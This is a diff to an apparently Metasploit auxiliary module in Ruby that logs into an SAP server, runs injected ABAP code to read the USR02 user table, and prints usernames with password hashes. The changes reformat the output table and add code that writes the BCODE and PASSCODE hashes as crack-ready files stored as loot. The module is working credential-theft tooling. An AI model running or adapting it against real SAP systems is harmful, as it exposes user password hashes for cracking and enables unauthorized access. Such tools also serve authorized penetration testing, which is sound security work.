@@ -50,15 +50,15 @@ class Metasploit4 < Msf::Auxiliary
 
   def exec_USR02(user, password)
     saptbl = Msf::Ui::Console::Table.new(
-              Msf::Ui::Console::Table::Style::Default,
-              'Header'  => "[SAP] Users and hashes #{rhost}:#{rport}:#{client}",
-              'Columns' =>
-                [
-                  "MANDT",
-                  "Username",
-                  "BCODE",
-                  "PASSCODE"
-                ])
+      Msf::Ui::Console::Table::Style::Default,
+      'Header'  => "[SAP] Users and hashes #{rhost}:#{rport}:#{client}",
+      'Columns' =>
+        [
+          "MANDT",
+          "Username",
+          "BCODE",
+          "PASSCODE"
+        ])
 
     login(rhost, rport, client, user, password) do |conn|
 
@@ -77,6 +77,9 @@ ABAPCODE
       begin
         result = rfc_abap_install_and_run(conn, code)
 
+        codevnB = ''
+        codevnG = ''
+
         result.each do |row|
           string = ""
           array = row[:ZEILE].split(/ /)
@@ -89,9 +92,23 @@ ABAPCODE
             end
             str_array = string.split(/,/)
             saptbl << [ str_array[1], str_array[2], str_array[3], str_array[4] ]
+            codevnB << "#{str_array[1]}-#{str_array[2]}:#{str_array[2]}#{' '*(40-str_array[2].length)}$#{str_array[3]}\r\n"
+            codevnG << "#{str_array[1]}-#{str_array[2]}:#{str_array[2]}#{' '*(40-str_array[2].length)}$#{str_array[4]}\r\n"
         end
 
         print(saptbl.to_s)
+
+        this_service = report_service(
+            :host  => rhost,
+            :port => rport,
+            :name => 'sap',
+            :proto => 'tcp'
+        )
+
+        loot_path = store_loot("sap.codevnB.hashes", "text/plain", rhost, codevnB, "#{rhost}", "SAP codevnB Hashes", this_service)
+        print_good("[SAP] #{rhost}:#{rport} - codevnB hashes stored in #{loot_path}")
+        loot_path = store_loot("sap.codevnG.hashes", "text/plain", rhost, codevnG, "#{rhost}", "SAP codevnG Hashes", this_service)
+        print_good("[SAP] #{rhost}:#{rport} - codevnG hashes stored in #{loot_path}")
       rescue NWError => e
         print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
       end
